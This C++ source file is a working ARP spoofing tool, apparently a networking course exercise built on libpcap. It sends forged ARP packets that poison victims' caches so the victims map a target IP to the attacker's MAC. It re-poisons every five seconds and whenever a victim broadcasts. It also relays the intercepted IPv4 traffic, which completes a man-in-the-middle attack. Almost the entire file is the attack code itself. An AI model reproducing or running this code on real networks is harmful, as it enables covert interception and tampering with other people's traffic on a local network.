#include <cstdio>
#include <map>
#include <vector>
#include <algorithm>
#include <thread>
#include <string>
#include <pcap.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "structs.h"

#define PROTO_ARP 0x806
#define ARP_REPLY 0x2

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

struct MACArray
{
	uint8_t mac[6];
};

Ip localIpAddress;
Mac localMacAddress;

std::map<uint32_t, MACArray> arpTable;
std::map<uint32_t, std::vector<uint32_t>> sourceList; // srcList

// TODO: Add sender table to determine ARP reinfect

void usage()
{
	printf("syntax : arp-spoof <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

void GetDeviceIPAndMAC(const char* deviceName)
{
	pcap_if_t *alldevs;
	char errbuf[PCAP_ERRBUF_SIZE];
	uint32_t res = pcap_findalldevs(&alldevs, errbuf);
	printf("Retrieving IP address for device %s...\n", deviceName);
	
	if(res != 0)
	{
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, errbuf);
	}
	
	for(pcap_if_t *d = alldevs; d != NULL; d = d->next)
	{
		if (strcmp(d->name, deviceName) == 0)
		{
			for(pcap_addr_t *a = d->addresses; a != NULL; a = a->next)
			{
				if(a->addr->sa_family == AF_INET)
				{
					localIpAddress = Ip(ntohl(((struct sockaddr_in*)a->addr)->sin_addr.s_addr));
					
					struct ifreq s;
					struct sockaddr *sa; 
					uint32_t fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
					strcpy(s.ifr_name, d->name);
					
					// Get MAC Address
					if (ioctl(fd, SIOCGIFHWADDR, &s) != 0)
					{
						printf("Failed to find MAC address.\n");
						pcap_freealldevs(alldevs);
						close(fd);
						exit(0);
					}
					
					uint8_t tmpmac[6];
					for (uint32_t i = 0; i < 6; i++)
						tmpmac[i] = s.ifr_addr.sa_data[i];

					localMacAddress = Mac(tmpmac);
					close(fd);
					pcap_freealldevs(alldevs);
					return;
				}
			}
		}
	}
	
	printf("Failed to find IP address.\n");
	pcap_freealldevs(alldevs);
	exit(0);
}

void SendARPPacket(pcap_t* handle, uint8_t opcode, Mac targetMAC, Mac sourceMac, Ip targetIP, Ip sourceIP)
{
	EthArpPacket packet;
	packet.eth_.dmac_ = targetMAC;
	packet.eth_.smac_ = sourceMac;
	packet.eth_.type_ = htons(EthHdr::Arp);
	
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(opcode);
	packet.arp_.smac_ = sourceMac;
	packet.arp_.sip_ = htonl(sourceIP);
	packet.arp_.tmac_ = targetMAC;
	packet.arp_.tip_ = htonl(targetIP);
	
	uint32_t res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0)
	{
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}

bool CheckSourceList(uint32_t ipAddr)
{
	auto iter = sourceList.find(ipAddr);
    return (iter != sourceList.end());
}

bool CheckARPTable(uint32_t ipAddr)
{
	auto iter = arpTable.find(ipAddr);
    return (iter != arpTable.end());
}

void AddARPTable(pcap_t* handle, uint32_t ipAddr)
{
    if (CheckARPTable(ipAddr) == true)
    {
       	// If exists, return function.
      	return;
    }
	
	// Send ARP broadcast to add MAC address table
    SendARPPacket(handle, ArpHdr::Request, Mac("ff:ff:ff:ff:ff:ff"), localMacAddress, Ip(ipAddr), localIpAddress);
}

void ResendARP(pcap_t* handle, bool isInfinite)
{
	do
	{
		if (isInfinite == true) sleep(5);

		for (auto it = sourceList.begin(); it != sourceList.end(); ++it)
		{
			for (int i = 0; i < it->second.size(); i++)
			{
				Ip targetIP = Ip(it->second.at(i));
				// Send spoofed ARP packet
				SendARPPacket(handle, ArpHdr::Request, Mac(arpTable[it->first].mac), localMacAddress, it->first, targetIP);
				printf("Resend an ARP infect (Victim: %s, Spoofed target: %s)\n", ((std::string)Ip(it->first)).c_str(), ((std::string)targetIP).c_str());
			}
    	}
	} while(isInfinite == true);
}

void PacketHandler(pcap_t* handle)
{
// Loop until we get requested ARP reply packet
	while (true)
	{
		struct pcap_pkthdr* header;
		const u_char* recvPacket;
		int res = pcap_next_ex(handle, &header, &recvPacket);
		
		if (res == 0)
		{
			printf("pcap_next_ex failed\n");
			return;
		}
		else if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
		{
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			return;
		}
		
		EthArpPacket recv;
		memcpy(&recv, recvPacket, sizeof(recv));

		if (recv.eth_.type() == EthHdr::Arp)
		{
			uint32_t senderIp = (recv.arp_.sip());
			uint8_t* senderMac = ((uint8_t*)(recv.arp_.smac()));

			// Add arp table with reply
			if (recv.arp_.op() == ArpHdr::Reply && CheckARPTable(senderIp) == false)
			{
	        	MACArray macarr = { senderMac[0], senderMac[1], senderMac[2], senderMac[3], senderMac[4], senderMac[5] };				
	        	arpTable[senderIp] = macarr;
				printf("Added arp table entry: (%s, %02X:%02X:%02X:%02X:%02X:%02X)\n", ((std::string)Ip(senderIp)).c_str(), senderMac[0], senderMac[1], senderMac[2], senderMac[3], senderMac[4], senderMac[5]);
			}
			
			
			// If sender IP broadcast is detected, resend ARP infect
			if (CheckSourceList(recv.arp_.sip()) == true && recv.arp_.op() == ArpHdr::Request)
			{
				ResendARP(handle, false);
			}
		}
		else if (ntohs(((struct libnet_ethernet_hdr*)(recvPacket))->ether_type) == 0x0800)	// If ipv4
		{
			
			uint32_t srcIP = ntohl(((struct libnet_ipv4_hdr*)(sizeof(struct libnet_ethernet_hdr) + recvPacket))->ip_src.s_addr);
			uint32_t dstIP = ntohl(((struct libnet_ipv4_hdr*)(sizeof(struct libnet_ethernet_hdr) + recvPacket))->ip_dst.s_addr);

			// If source ip is sender, relay this packet
			// Change src mac to local IP's, change dst mac to dst IP's
			if (CheckSourceList(srcIP) == true)
			{
				u_int8_t* srcMac = ((struct libnet_ethernet_hdr*)recvPacket)->ether_shost;
        		u_int8_t* dstMac = ((struct libnet_ethernet_hdr*)recvPacket)->ether_dhost;
				
				memcpy(srcMac, (uint8_t*)localMacAddress, 6);
				memcpy(dstMac, arpTable[dstIP].mac, 6);

				printf("DstMAC: %02X:%02X:%02X:%02X:%02X:%02X\n", arpTable[dstIP].mac[0], arpTable[dstIP].mac[1], arpTable[dstIP].mac[2], arpTable[dstIP].mac[3], arpTable[dstIP].mac[4], arpTable[dstIP].mac[5]);


				uint32_t res = pcap_sendpacket(handle, recvPacket, header->caplen);
				if (res != 0)
				{
					fprintf(stderr, "Relay failed. pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
				}

				printf("Relayed some packet\n");
			}
		}
	}
}

int main(int argc, char* argv[])
{
	if (argc % 2 != 0 || argc < 3)
	{
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	GetDeviceIPAndMAC(dev);
	printf("===== Device Info of %s =====\n", dev);
	printf("Local IP: %s\nLocal MAC: %s\n", ((std::string)localIpAddress).c_str(), ((std::string)localMacAddress).c_str());
	printf("===============================\n\n");

	// Start receiver thread to receive ARP info
	std::thread t1(&PacketHandler, handle);
	std::thread t2(&ResendARP, handle, true);

	sleep(1);
	uint32_t loopCount = (argc - 1) / 2;
	printf("Start ARP spoof...\nTotal targets: %d\n", loopCount);
	for (uint32_t i = 1; i <= loopCount; i++)
	{
		Ip sourceIP = Ip(argv[(2 * i)]);
		Ip targetIP = Ip(argv[(2 * i) + 1]);
		
		AddARPTable(handle, sourceIP);
		AddARPTable(handle, targetIP);

		sourceList[sourceIP].push_back(targetIP);
	}
	printf("Initializing ARP Table...\n");
	sleep(2);
	for (uint32_t i = 1; i <= loopCount; i++)
	{
		Ip sourceIP = Ip(argv[(2 * i)]);
		Ip targetIP = Ip(argv[(2 * i) + 1]);
		
		// Send spoofed ARP packet
		SendARPPacket(handle, ArpHdr::Request, Mac(arpTable[sourceIP].mac), localMacAddress, sourceIP, targetIP);
		printf("[#%d] Send an ARP reply (Victim: %s, Spoofed target: %s)\n", i, ((std::string)sourceIP).c_str(), ((std::string)targetIP).c_str());
	}
	t1.join();
	// Prevent program close
	

	pcap_close(handle);
	return 0;
}
